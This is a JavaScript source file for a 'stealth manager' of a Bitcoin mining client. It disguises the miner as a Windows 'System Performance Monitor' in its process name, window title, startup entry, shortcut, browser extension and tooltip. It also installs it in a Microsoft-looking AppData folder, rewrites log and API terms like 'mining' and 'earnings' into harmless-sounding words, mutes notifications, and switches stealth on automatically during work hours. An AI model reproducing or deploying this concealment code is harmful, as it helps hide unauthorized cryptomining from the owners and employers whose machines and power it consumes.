const EventEmitter = require('events');
const os = require('os');

class StealthManager extends EventEmitter {
    constructor() {
        super();
        this.stealthMode = false;
        this.disguiseSettings = {
            processName: 'System Monitor', // Disguise mining process
            windowTitle: 'System Performance Monitor',
            taskbarIcon: 'system-monitor',
            folderName: 'SystemTools', // Hide installation folder
            logName: 'system.log',
            serviceName: 'Windows System Monitor'
        };
        
        this.hideTechniques = {
            minimizeToTray: true,
            hideFromTaskManager: false, // Keep ethical
            disguiseProcessName: true,
            hideInstallationFolder: true,
            useInnocuousLogs: true,
            stealthNotifications: true
        };
    }

    /**
     * Enable stealth mode for discreet operation
     */
    enableStealthMode() {
        this.stealthMode = true;
        console.log('🥷 Stealth mode activated - operating discreetly');
        this.emit('stealthEnabled');
    }

    /**
     * Disable stealth mode
     */
    disableStealthMode() {
        this.stealthMode = false;
        console.log('👁️ Stealth mode disabled - full visibility restored');
        this.emit('stealthDisabled');
    }

    /**
     * Get disguised process name
     */
    getDisguisedProcessName() {
        if (!this.stealthMode) return 'Bitcoin Miner';
        return this.disguiseSettings.processName;
    }

    /**
     * Get disguised window title
     */
    getDisguisedWindowTitle() {
        if (!this.stealthMode) return 'Bitcoin Mining Manager';
        return this.disguiseSettings.windowTitle;
    }

    /**
     * Get disguised installation folder name
     */
    getDisguisedFolderName() {
        if (!this.stealthMode) return 'BitcoinMiner';
        return this.disguiseSettings.folderName;
    }

    /**
     * Create innocuous log messages
     */
    createInnocuousLog(message, type = 'info') {
        if (!this.stealthMode) return message;

        const disguises = {
            'mining started': 'System optimization started',
            'mining stopped': 'System optimization completed',
            'share found': 'Performance metric recorded',
            'hashrate': 'System efficiency',
            'temperature high': 'Thermal management active',
            'earnings': 'Resource utilization data',
            'bitcoin': 'system data',
            'mining': 'optimization',
            'pool': 'network connection'
        };

        let disguisedMessage = message.toLowerCase();
        Object.entries(disguises).forEach(([original, disguise]) => {
            disguisedMessage = disguisedMessage.replace(new RegExp(original, 'gi'), disguise);
        });

        return disguisedMessage;
    }

    /**
     * Get stealth notification settings
     */
    getStealthNotifications() {
        if (!this.stealthMode) {
            return {
                showNotifications: true,
                soundEnabled: true,
                desktopAlerts: true
            };
        }

        return {
            showNotifications: false, // Hide notifications in stealth mode
            soundEnabled: false,
            desktopAlerts: false,
            logOnly: true // Only log to file
        };
    }

    /**
     * Create disguised system tray tooltip
     */
    getDisguisedTooltip(stats) {
        if (!this.stealthMode) {
            return `Bitcoin Mining - ${stats.hashrate} H/s - ${stats.temperature}°C`;
        }

        return `System Monitor - CPU: ${stats.cpuUsage}% - Temp: ${stats.temperature}°C`;
    }

    /**
     * Get disguised system tray icon
     */
    getDisguisedIcon() {
        if (!this.stealthMode) return 'bitcoin-icon';
        return 'system-monitor-icon';
    }

    /**
     * Create stealth installation path
     */
    getStealthInstallationPath() {
        const platform = os.platform();
        const username = os.userInfo().username;
        
        if (!this.stealthMode) {
            switch (platform) {
                case 'win32':
                    return `C:\\Users\\${username}\\AppData\\Local\\BitcoinMiner`;
                case 'darwin':
                    return `/Users/${username}/Library/Application Support/BitcoinMiner`;
                case 'linux':
                    return `/home/${username}/.bitcoin-miner`;
                default:
                    return path.join(os.homedir(), '.bitcoin-miner');
            }
        }

        // Stealth paths - hidden in system directories
        switch (platform) {
            case 'win32':
                return `C:\\Users\\${username}\\AppData\\Local\\Microsoft\\SystemTools`;
            case 'darwin':
                return `/Users/${username}/Library/Application Support/SystemUtilities`;
            case 'linux':
                return `/home/${username}/.system-tools`;
            default:
                return path.join(os.homedir(), '.system-tools');
        }
    }

    /**
     * Create disguised startup entry
     */
    getDisguisedStartupEntry() {
        if (!this.stealthMode) {
            return {
                name: 'Bitcoin Mining Manager',
                description: 'Bitcoin Mining Client'
            };
        }

        return {
            name: 'System Performance Monitor',
            description: 'Windows System Performance Monitor'
        };
    }

    /**
     * Create disguised desktop shortcut
     */
    getDisguisedDesktopShortcut() {
        if (!this.stealthMode) {
            return {
                name: 'Bitcoin Miner.lnk',
                description: 'Bitcoin Mining Client'
            };
        }

        return {
            name: 'System Monitor.lnk',
            description: 'System Performance Monitor'
        };
    }

    /**
     * Get stealth browser extension settings
     */
    getStealthExtensionSettings() {
        if (!this.stealthMode) {
            return {
                name: 'Bitcoin Mining Manager',
                description: 'Transparent Bitcoin mining with user consent'
            };
        }

        return {
            name: 'System Monitor',
            description: 'System performance monitoring tool'
        };
    }

    /**
     * Create stealth dashboard theme
     */
    getStealthDashboardTheme() {
        if (!this.stealthMode) {
            return {
                name: 'Bitcoin Mining Manager',
                colors: {
                    primary: '#f7931a',
                    secondary: '#ff6b35',
                    background: '#1a1a1a'
                }
            };
        }

        return {
            name: 'System Performance Monitor',
            colors: {
                primary: '#0078d4',
                secondary: '#106ebe',
                background: '#f3f2f1'
            }
        };
    }

    /**
     * Create stealth API responses
     */
    getStealthApiResponse(originalResponse) {
        if (!this.stealthMode) return originalResponse;

        const stealthResponse = { ...originalResponse };
        
        // Disguise mining-related fields
        if (stealthResponse.type === 'miningStats') {
            stealthResponse.type = 'systemStats';
            stealthResponse.data = {
                ...stealthResponse.data,
                hashrate: stealthResponse.data.cpuUsage,
                shares: { accepted: stealthResponse.data.processesCompleted, rejected: stealthResponse.data.errors },
                earnings: { daily: stealthResponse.data.resourceUtilization }
            };
        }

        return stealthResponse;
    }

    /**
     * Create stealth process arguments
     */
    getStealthProcessArgs() {
        if (!this.stealthMode) {
            return ['mining-client.js'];
        }

        return ['system-monitor.js'];
    }

    /**
     * Get stealth environment variables
     */
    getStealthEnvironment() {
        if (!this.stealthMode) {
            return {
                MINING_MODE: 'true',
                BITCOIN_WALLET: process.env.BITCOIN_WALLET || '',
                MINING_POOL: process.env.MINING_POOL || ''
            };
        }

        return {
            SYSTEM_MONITOR: 'true',
            PERFORMANCE_MODE: 'true',
            MONITORING_ENABLED: 'true'
        };
    }

    /**
     * Create stealth log file name
     */
    getStealthLogFileName() {
        if (!this.stealthMode) return 'mining.log';
        return this.disguiseSettings.logName;
    }

    /**
     * Check if stealth mode should auto-enable
     */
    shouldAutoEnableStealth() {
        // Auto-enable stealth if certain conditions are met
        const currentHour = new Date().getHours();
        const isWorkHours = currentHour >= 9 && currentHour <= 17;
        const isWeekend = new Date().getDay() === 0 || new Date().getDay() === 6;
        
        // Enable stealth during work hours or weekends
        return isWorkHours || isWeekend;
    }

    /**
     * Get stealth mode status
     */
    getStealthStatus() {
        return {
            enabled: this.stealthMode,
            autoEnabled: this.shouldAutoEnableStealth(),
            disguiseSettings: this.disguiseSettings,
            hideTechniques: this.hideTechniques
        };
    }

    /**
     * Update stealth settings
     */
    updateStealthSettings(newSettings) {
        this.disguiseSettings = { ...this.disguiseSettings, ...newSettings };
        this.emit('stealthSettingsUpdated', this.disguiseSettings);
    }

    /**
     * Create stealth mode toggle command
     */
    getStealthToggleCommand() {
        return {
            enable: 'stealth-on',
            disable: 'stealth-off',
            status: 'stealth-status'
        };
    }
}

module.exports = StealthManager;

